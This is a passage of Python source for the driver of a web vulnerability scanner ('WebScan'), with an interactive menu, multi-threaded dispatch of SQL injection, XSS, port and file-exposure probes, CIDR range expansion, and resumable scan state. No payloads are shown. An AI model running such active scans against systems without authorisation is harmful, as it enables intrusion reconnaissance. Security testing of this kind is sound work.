    # Process custom headers
    args.custom_headers = {}
    if args.headers:
        try:
            for header_pair in args.headers.split(';'):
                if ':' in header_pair:
                    name, value = header_pair.split(':', 1)
                    args.custom_headers[name.strip()] = value.strip()
        except Exception:
            parser.error("Invalid header format. Use 'Header1: value1; Header2: value2'")
    
    # Always include User-Agent in custom headers
    args.custom_headers['User-Agent'] = args.user_agent
    
    # Process cookies
    if args.cookies:
        args.custom_headers['Cookie'] = args.cookies
    
    # Disable colors if requested
    if args.no_color:
        init(autoreset=True, strip=True)
    
    return args

def run_scanner(scanner_class, target_url, args, results, logger):
    """Run a specific scanner module and collect results."""
    scanner_name = scanner_class.__name__
    try:
        logger.info(f"Starting {scanner_name} scan on {target_url}")
        scanner = scanner_class(
            target_url=target_url,
            timeout=args.timeout,
            depth=args.depth,
            user_agent=args.user_agent,
            logger=logger,
            verbose=args.verbose
        )
        scan_results = scanner.scan()
        results.extend(scan_results)
        logger.info(f"Completed {scanner_name} scan on {target_url}")
    except Exception as e:
        logger.error(f"Error during {scanner_name} scan: {str(e)}")
        print(f"{Fore.RED}[ERROR] {scanner_name} scan failed: {str(e)}")

def run_interactive_mode():
    """Run the scanner in interactive mode with menu-based options."""
    print_banner()
    print(f"{Fore.CYAN}Welcome to WebScan Interactive Mode")
    print(f"{Fore.CYAN}================================={Style.RESET_ALL}")
    
    # Setup the logger
    logger = setup_logger()
    
    while True:
        print_interactive_menu()
        choice = input(f"{Fore.GREEN}Enter your choice (0-6): {Style.RESET_ALL}")
        
        if choice == '0':
            print(f"{Fore.CYAN}Exiting WebScan. Thank you for using our tool!{Style.RESET_ALL}")
            break
            
        elif choice == '1':
            # Quick Scan (headers, info disclosure)
            target = input(f"{Fore.GREEN}Enter target URL: {Style.RESET_ALL}")
            if not target:
                print(f"{Fore.RED}Target URL is required{Style.RESET_ALL}")
                continue
                
            # Create args object using the global ScanArgs class
            args = ScanArgs()
            args.url = target
            args.scan_types = ['headers', 'info']
            args.timeout = 10
            args.threads = 5
            args.depth = 1
            args.crawl = False
            args.verbose = False
            args.output = 'webscan_report.txt'
            args.user_agent = USER_AGENT
            args.custom_headers = {'User-Agent': USER_AGENT}
            args.show_progress = True
            args.save_state = False
            args.risk_threshold = 1.0
            args.aggressive = False
            args.quiet = False
            args.json = False
            
            # Run the scan
            run_scan_on_target(args, logger)
            
            input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == '2':
            # Standard Scan (SQL injection, XSS, headers, info)
            target = input(f"{Fore.GREEN}Enter target URL: {Style.RESET_ALL}")
            if not target:
                print(f"{Fore.RED}Target URL is required{Style.RESET_ALL}")
                continue
                
            # Create args object for compatibility
            args = ScanArgs()
            args.url = target
            args.scan_types = ['sqli', 'xss', 'headers', 'info']
            args.timeout = 15
            args.threads = 10
            args.depth = 2
            args.crawl = True
            args.verbose = False
            args.output = 'webscan_report.txt'
            args.user_agent = USER_AGENT
            args.custom_headers = {'User-Agent': USER_AGENT}
            args.show_progress = True
            args.save_state = True
            args.risk_threshold = 1.0
            args.aggressive = False
            args.quiet = False
            args.json = False
            
            # Run the scan
            run_scan_on_target(args, logger)
            
            input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == '3':
            # Full Scan (all checks)
            target = input(f"{Fore.GREEN}Enter target URL: {Style.RESET_ALL}")
            if not target:
                print(f"{Fore.RED}Target URL is required{Style.RESET_ALL}")
                continue
                
            print(f"{Fore.YELLOW}Warning: Full scan may take a long time and generate a lot of traffic.{Style.RESET_ALL}")
            confirm = input(f"{Fore.GREEN}Do you want to continue? (y/n): {Style.RESET_ALL}").lower()
            
            if confirm != 'y':
                continue
                
            # Create args object
            args = ScanArgs()
            args.url = target
            args.scan_types = ['sqli', 'xss', 'port', 'dir', 'files', 'headers', 'ssl', 'info']
            args.timeout = 20
            args.threads = 15
            args.depth = 3
            args.crawl = True
            args.verbose = True
            args.output = 'webscan_full_report.txt'
            args.user_agent = USER_AGENT
            args.custom_headers = {'User-Agent': USER_AGENT}
            args.show_progress = True
            args.save_state = True
            args.risk_threshold = 1.0
            args.aggressive = True
            args.quiet = False
            args.json = False
            
            # Run the scan
            run_scan_on_target(args, logger)
            
            input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == '4':
            # Custom Scan
            target = input(f"{Fore.GREEN}Enter target URL: {Style.RESET_ALL}")
            if not target:
                print(f"{Fore.RED}Target URL is required{Style.RESET_ALL}")
                continue
            
            print(f"{Fore.CYAN}Available scan types:{Style.RESET_ALL}")
            scan_types = ['sqli', 'xss', 'port', 'dir', 'files', 'headers', 'ssl', 'info']
            scan_descriptions = {
                'sqli': 'SQL Injection vulnerabilities',
                'xss': 'Cross-Site Scripting (XSS) vulnerabilities',
                'port': 'Open port scanning',
                'dir': 'Directory traversal vulnerabilities',
                'files': 'Sensitive file exposure',
                'headers': 'HTTP security headers',
                'ssl': 'SSL/TLS configuration issues',
                'info': 'Information disclosure'
            }
            
            for i, scan_type in enumerate(scan_types, 1):
                print(f"  {i}. {scan_type} - {scan_descriptions[scan_type]}")
            
            selected = input(f"{Fore.GREEN}Select scan types (comma-separated numbers): {Style.RESET_ALL}")
            selected_types = []
            
            try:
                for num in selected.split(','):
                    idx = int(num.strip()) - 1
                    if 0 <= idx < len(scan_types):
                        selected_types.append(scan_types[idx])
            except ValueError:
                print(f"{Fore.RED}Invalid selection. Using 'headers' and 'info' as defaults.{Style.RESET_ALL}")
                selected_types = ['headers', 'info']
            
            if not selected_types:
                print(f"{Fore.RED}No valid scan types selected. Using 'headers' and 'info' as defaults.{Style.RESET_ALL}")
                selected_types = ['headers', 'info']
            
            # Additional options
            threads = input(f"{Fore.GREEN}Number of threads (default: 5): {Style.RESET_ALL}")
            threads = int(threads) if threads.isdigit() and int(threads) > 0 else 5
            
            timeout = input(f"{Fore.GREEN}Request timeout in seconds (default: 10): {Style.RESET_ALL}")
            timeout = int(timeout) if timeout.isdigit() and int(timeout) > 0 else 10
            
            aggressive = input(f"{Fore.GREEN}Enable aggressive scanning? (y/n, default: n): {Style.RESET_ALL}").lower() == 'y'
            
            output_format = input(f"{Fore.GREEN}Output format (txt/json, default: txt): {Style.RESET_ALL}").lower()
            json_output = output_format == 'json'
            
            output_file = input(f"{Fore.GREEN}Output file (default: webscan_custom_report.txt): {Style.RESET_ALL}")
            output_file = output_file if output_file else 'webscan_custom_report.txt'
            
            if json_output and not output_file.lower().endswith('.json'):
                output_file = os.path.splitext(output_file)[0] + '.json'
            
            # Create args object
            args = ScanArgs()
            args.url = target
            args.scan_types = selected_types
            args.timeout = timeout
            args.threads = threads
            args.depth = 2
            args.crawl = True
            args.verbose = True
            args.output = output_file
            args.user_agent = USER_AGENT
            args.custom_headers = {'User-Agent': USER_AGENT}
            args.show_progress = True
            args.save_state = True
            args.risk_threshold = 1.0
            args.aggressive = aggressive
            args.quiet = False
            args.json = json_output
            
            # Run the scan
            run_scan_on_target(args, logger)
            
            input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == '5':
            # Target Discovery (port scan, harvesting)
            target_spec = input(f"{Fore.GREEN}Enter target (IP, domain, or CIDR range): {Style.RESET_ALL}")
            if not target_spec:
                print(f"{Fore.RED}Target specification is required{Style.RESET_ALL}")
                continue
            
            # Create args object
            args = ScanArgs()
            args.url = target_spec
            args.scan_types = ['port', 'info']
            args.timeout = 5
            args.threads = 20
            args.depth = 1
            args.crawl = False
            args.verbose = True
            args.output = 'webscan_discovery_report.txt'
            args.user_agent = USER_AGENT
            args.custom_headers = {'User-Agent': USER_AGENT}
            args.show_progress = True
            args.save_state = False
            args.risk_threshold = 1.0
            args.aggressive = False
            args.quiet = False
            args.json = False
            args.target_list = ''  # Set to empty string instead of None
            
            # Expand targets if it's a CIDR range
            targets = expand_targets(target_spec)
            
            if len(targets) > 1:
                print(f"{Fore.CYAN}Expanded to {len(targets)} targets{Style.RESET_ALL}")
                
                for i, target in enumerate(targets[:10], 1):
                    print(f"  {i}. {target}")
                
                if len(targets) > 10:
                    print(f"  ... and {len(targets) - 10} more")
                
                confirm = input(f"{Fore.GREEN}Scan all these targets? (y/n): {Style.RESET_ALL}").lower()
                
                if confirm != 'y':
                    continue
                
                # Use the first target as a template and scan all targets
                for target in targets:
                    args.url = target
                    run_scan_on_target(args, logger, show_summary=False)
                
                print(f"{Fore.GREEN}All targets scanned. Results saved to {args.output}{Style.RESET_ALL}")
            else:
                # Just one target
                run_scan_on_target(args, logger)
            
            input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == '6':
            # Resume Previous Scan
            # List available resume files
            resume_dir = Path('.')
            resume_files = list(resume_dir.glob('webscan_state_*.json'))
            
            if not resume_files:
                print(f"{Fore.RED}No resume files found{Style.RESET_ALL}")
                input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
                continue
            
            print(f"{Fore.CYAN}Available resume files:{Style.RESET_ALL}")
            for i, file in enumerate(resume_files, 1):
                print(f"  {i}. {file.name}")
            
            selection = input(f"{Fore.GREEN}Select a file to resume (number): {Style.RESET_ALL}")
            
            try:
                idx = int(selection) - 1
                if 0 <= idx < len(resume_files):
                    resume_file = str(resume_files[idx])
                    resume_data = load_scan_state(resume_file)
                    
                    if not resume_data:
                        print(f"{Fore.RED}Error loading resume data{Style.RESET_ALL}")
                        continue
                    
                    print(f"{Fore.CYAN}Resuming scan for {resume_data.get('target_url', 'unknown')}{Style.RESET_ALL}")
                    
                    # Create args object from resume data
                    args = ScanArgs()
                    args.url = resume_data.get('target_url', 'https://example.com')  # Provide default URL to avoid None
                    args.scan_types = resume_data.get('scan_types', ['headers', 'info'])
                    args.timeout = resume_data.get('timeout', 10)
                    args.threads = resume_data.get('threads', 5)
                    args.depth = resume_data.get('depth', 2)
                    args.crawl = resume_data.get('crawl', False)
                    args.verbose = resume_data.get('verbose', False)
                    args.output = resume_data.get('output_file', 'webscan_resumed_report.txt')
                    args.user_agent = resume_data.get('user_agent', USER_AGENT)
                    args.custom_headers = resume_data.get('custom_headers', {'User-Agent': USER_AGENT})
                    args.show_progress = True
                    args.save_state = True
                    args.risk_threshold = resume_data.get('risk_threshold', 1.0)
                    args.aggressive = resume_data.get('aggressive', False)
                    args.quiet = False
                    args.json = resume_data.get('json_output', False)
                    args.resume = resume_file
                    
                    # Run the scan
                    run_scan_on_target(args, logger)
                else:
                    print(f"{Fore.RED}Invalid selection{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}Invalid selection{Style.RESET_ALL}")
            
            input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            
        else:
            print(f"{Fore.RED}Invalid choice. Please try again.{Style.RESET_ALL}")
    
    return 0


def run_scan_on_target(args, logger, show_summary=True):
    """Run a scan on a specific target with given args."""
    global SCAN_INTERRUPTED
    SCAN_INTERRUPTED = False
    
    # Register signal handler for interruption
    signal.signal(signal.SIGINT, signal_handler)
    
    # Ensure the target URL has a valid format
    if args.url and not args.url.startswith(('http://', 'https://')):
        args.url = f"http://{args.url}"
    
    start_time = time.time()
    
    # Initialize the resume state
    if hasattr(args, 'resume') and args.resume:
        resume_data = load_scan_state(args.resume)
        if resume_data:
            print(f"{Fore.CYAN}[INFO] Resuming scan from previously saved state")
            # Retrieve completed URLs and other state data
            completed_urls = resume_data.get('completed_urls', [])
            all_results = resume_data.get('vulnerabilities', [])
        else:
            print(f"{Fore.RED}[ERROR] Failed to load resume data. Starting a new scan")
            completed_urls = []
            all_results = []
    else:
        completed_urls = []
        all_results = []
    
    # Create state file name for saving progress
    scan_timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    state_file = f"webscan_state_{scan_timestamp}.json"
    
    # Check if URL is accessible
    if not args.quiet:
        print(f"{Fore.CYAN}[INFO] Checking target URL accessibility...")
    
    try:
        if not is_url_accessible(args.url, args.timeout):
            print(f"{Fore.RED}[ERROR] Target URL {args.url} is not accessible.")
            logger.error(f"Target URL {args.url} is not accessible")
            return 1
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Error checking URL accessibility: {str(e)}")
        logger.error(f"Error checking URL accessibility: {str(e)}")
        return 1
    
    if not args.quiet:
        print(f"{Fore.GREEN}[SUCCESS] Target URL is accessible")
        print(f"{Fore.CYAN}[INFO] Starting vulnerability scan on {args.url}")
        print(f"{Fore.CYAN}[INFO] Scan types: {', '.join(args.scan_types)}")
    
    # Initialize Reporter
    reporter = Reporter(args.output)
    reporter.start_report(args.url, args.scan_types)
    
    # Collection of scanner classes to use based on scan types
    scanner_map = {
        'sqli': SQLInjectionScanner,
        'xss': XSSScanner,
        'port': PortScanner,
        'dir': DirectoryTraversalScanner,
        'files': SensitiveFileScanner,
        'headers': HTTPHeaderScanner,
        'ssl': SSLTLSScanner,
        'info': InfoDisclosureScanner
    }
    
    # Select scanners based on requested types
    scanners_to_run = [scanner_map[scan_type] for scan_type in args.scan_types if scan_type in scanner_map]
    
    # Initialize progress indicator if requested
    total_scanners = len(scanners_to_run)
    progress = None
    
    if hasattr(args, 'show_progress') and args.show_progress and not args.quiet:
        progress = ProgressIndicator(
            total_items=total_scanners,
            prefix=f'{Fore.CYAN}Scan Progress:',
            suffix='Complete',
            length=40
        )
    
    # Run scanners with multi-threading
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_scanner = {
            executor.submit(run_scanner, scanner_class, args.url, args, all_results, logger): scanner_class.__name__
            for scanner_class in scanners_to_run
        }
        
        # Process results as they complete
        for future in concurrent.futures.as_completed(future_to_scanner):
            scanner_name = future_to_scanner[future]
            try:
                future.result()  # Get any exceptions that may have been raised
                
                if not args.quiet:
                    print(f"{Fore.GREEN}[COMPLETE] {scanner_name} scan finished")
                
                # Update progress indicator
                if progress:
                    progress.update()
                
                # Update completed scanners for resume
                completed_urls.append(scanner_name)
                
                # Save progress state if requested
                if hasattr(args, 'save_state') and args.save_state:
                    state_data = {
                        'target_url': args.url,
                        'scan_types': args.scan_types,
                        'completed_urls': completed_urls,
                        'vulnerabilities': all_results,
                        'timeout': getattr(args, 'timeout', 10),
                        'threads': getattr(args, 'threads', 5),
                        'depth': getattr(args, 'depth', 2),
                        'crawl': getattr(args, 'crawl', False),
                        'verbose': getattr(args, 'verbose', False),
                        'output_file': getattr(args, 'output', 'webscan_report.txt'),
                        'user_agent': getattr(args, 'user_agent', USER_AGENT),
                        'custom_headers': getattr(args, 'custom_headers', {'User-Agent': USER_AGENT}),
                        'risk_threshold': getattr(args, 'risk_threshold', 1.0),
                        'aggressive': getattr(args, 'aggressive', False),
                        'json_output': getattr(args, 'json', False),
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                    save_scan_state(state_file, state_data)
                
                # Check for user interruption
                if SCAN_INTERRUPTED:
                    break
                
            except Exception as e:
                if not args.quiet:
                    print(f"{Fore.RED}[ERROR] {scanner_name} scan failed: {str(e)}")
                
                # Update progress indicator even on failure
                if progress:
                    progress.update()
    
    # Make sure progress indicator shows completion
    if progress:
        progress.finish()
    
    # If scan was interrupted, save state and exit
    if SCAN_INTERRUPTED:
        state_data = {
            'target_url': args.url,
            'scan_types': args.scan_types,
            'completed_urls': completed_urls,
            'vulnerabilities': all_results,
            'timeout': getattr(args, 'timeout', 10),
            'threads': getattr(args, 'threads', 5),
            'depth': getattr(args, 'depth', 2),
            'crawl': getattr(args, 'crawl', False),
            'verbose': getattr(args, 'verbose', False),
            'output_file': getattr(args, 'output', 'webscan_report.txt'),
            'user_agent': getattr(args, 'user_agent', USER_AGENT),
            'custom_headers': getattr(args, 'custom_headers', {'User-Agent': USER_AGENT}),
            'risk_threshold': getattr(args, 'risk_threshold', 1.0),
            'aggressive': getattr(args, 'aggressive', False),
            'json_output': getattr(args, 'json', False),
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        saved = save_scan_state(state_file, state_data)
        if saved:
            print(f"{Fore.YELLOW}[WARNING] Scan interrupted. Progress saved to {state_file}")
            print(f"{Fore.YELLOW}[WARNING] Resume with: python webscan_standalone.py --resume {state_file}")
        else:
            print(f"{Fore.RED}[ERROR] Scan interrupted. Failed to save state.")
        
        return 1
    
    # Filter vulnerabilities based on risk threshold if specified
    if hasattr(args, 'risk_threshold') and args.risk_threshold > 1.0:
        filtered_results = []
        for vuln in all_results:
            risk_score = calculate_risk_score(vuln)
            if risk_score >= args.risk_threshold:
                # Add risk score to the vulnerability
                vuln['risk_score'] = risk_score
                filtered_results.append(vuln)
        
        if not args.quiet and len(filtered_results) < len(all_results):
            print(f"{Fore.YELLOW}[INFO] Filtered out {len(all_results) - len(filtered_results)} vulnerabilities below risk threshold {args.risk_threshold}")
        
        all_results = filtered_results
    else:
        # Add risk scores to all vulnerabilities
        for vuln in all_results:
            vuln['risk_score'] = calculate_risk_score(vuln)
    
    # Generate report
    reporter.add_vulnerabilities(all_results)
    report_path = reporter.finalize_report(time.time() - start_time)
    
    # Show summary if requested
    if show_summary and not args.quiet:
        # Summary
        total_time = time.time() - start_time
        vulnerabilities_count = len(all_results)
        
        print(f"\n{Fore.CYAN}{'=' * 60}")
        print(f"{Fore.CYAN}[SCAN SUMMARY]")
        print(f"{Fore.CYAN}{'=' * 60}")
        print(f"{Fore.WHITE}Target URL: {args.url}")
        print(f"{Fore.WHITE}Scan Duration: {total_time:.2f} seconds")
        print(f"{Fore.WHITE}Vulnerabilities Found: {vulnerabilities_count}")
        print(f"{Fore.WHITE}Report saved to: {report_path}")
        print(f"{Fore.CYAN}{'=' * 60}\n")
        
        if vulnerabilities_count > 0:
            severity_counts = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0, 'Info': 0}
            for result in all_results:
                severity_counts[result['severity']] = severity_counts.get(result['severity'], 0) + 1
            
            print(f"{Fore.CYAN}[VULNERABILITY SUMMARY]")
            for severity, count in severity_counts.items():
                if count > 0:
                    color = Fore.RED if severity in ['Critical', 'High'] else (
                        Fore.YELLOW if severity == 'Medium' else (
                            Fore.BLUE if severity == 'Low' else Fore.WHITE
                        )
                    )
                    print(f"{color}{severity}: {count}")
    
    logger.info(f"Scan completed. Found {len(all_results)} vulnerabilities. Report saved to {report_path}")
    
    return 0


def main():
    """Main function to run the vulnerability scanner."""
    # Capture start time for overall execution timing
    start_total = time.time()
    
    # Setup signal handler for clean exit
    signal.signal(signal.SIGINT, signal_handler)
    
    print_banner()
    args = parse_arguments()
    
    # Setup logging
    log_level = logging.DEBUG if args.verbose else (logging.ERROR if args.quiet else logging.INFO)
    logger = setup_logger(args.log_file, log_level, args.no_color)
    
    # Log startup information
    logger.info(f"WebScan v{VERSION} started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    # Check for optional dependencies and log their status
    # This helps users understand which enhanced features are available
    if not TRAFILATURA_AVAILABLE:
        logger.info("Optional dependency 'trafilatura' not found. Content extraction will be limited.")
    if not DNS_AVAILABLE:
        logger.info("Optional dependency 'dnspython' not found. DNS reconnaissance will be limited.")
    if not SELENIUM_AVAILABLE:
        logger.info("Optional dependency 'selenium' not found. Dynamic scanning will be disabled.")
    
    # Interactive mode
    if args.interactive:
        return run_interactive_mode()
    
    # Resume mode
    if args.resume:
        resume_data = load_scan_state(args.resume)
        if not resume_data:
            print(f"{Fore.RED}[ERROR] Failed to load resume data from {args.resume}")
            return 1
        
        # Override args with resume data
        args.url = resume_data.get('target_url', 'https://example.com')  # Default to prevent None
        args.scan_types = resume_data.get('scan_types', args.scan_types)
        args.timeout = resume_data.get('timeout', args.timeout)
        args.threads = resume_data.get('threads', args.threads)
        args.depth = resume_data.get('depth', args.depth)
        
        print(f"{Fore.CYAN}[INFO] Resuming scan for {args.url}")
    
    # Expand targets if using target list
    targets = []
    if args.target_list:
        targets = expand_targets(args.url, args.target_list)
        print(f"{Fore.CYAN}[INFO] Loaded {len(targets)} targets from {args.target_list}")
    elif args.url and ('/' in args.url and not args.url.startswith(('http://', 'https://'))):
        # It might be a CIDR range
        targets = expand_targets(args.url)
        print(f"{Fore.CYAN}[INFO] Expanded target to {len(targets)} targets")
    else:
        # Single target
        targets = [args.url]
    
    # Single target or multiple targets
    if len(targets) == 1:
        args.url = targets[0]
        return run_scan_on_target(args, logger)
    else:
        # Process multiple targets
        successful = 0
        failed = 0
        
        for target in targets:
            print(f"{Fore.CYAN}[INFO] Scanning target: {target}")
            args.url = target
            
            # Adjust output file for each target
            if args.output:
                base_name, ext = os.path.splitext(args.output)
                # Replace any colons in the domain with underscores for filename safety
                netloc = urlparse(target).netloc
                # Replace colons with underscores using a safer string method
                safe_netloc = netloc
                if ':' in safe_netloc:
                    safe_netloc = '_'.join(safe_netloc.split(':'))
                args.output = f"{base_name}_{safe_netloc}{ext}"
            
            result = run_scan_on_target(args, logger, show_summary=True)
            
            if result == 0:
                successful += 1
            else:
                failed += 1
            
            # Check for user interruption
            if SCAN_INTERRUPTED:
                print(f"{Fore.YELLOW}[WARNING] Scan interrupted by user after {successful} successful and {failed} failed scans")
                break
        
        print(f"{Fore.CYAN}[INFO] Completed scanning {successful + failed} targets ({successful} successful, {failed} failed)")
        
        return 0 if failed == 0 else 1

if __name__ == "__main__":
    sys.exit(main())

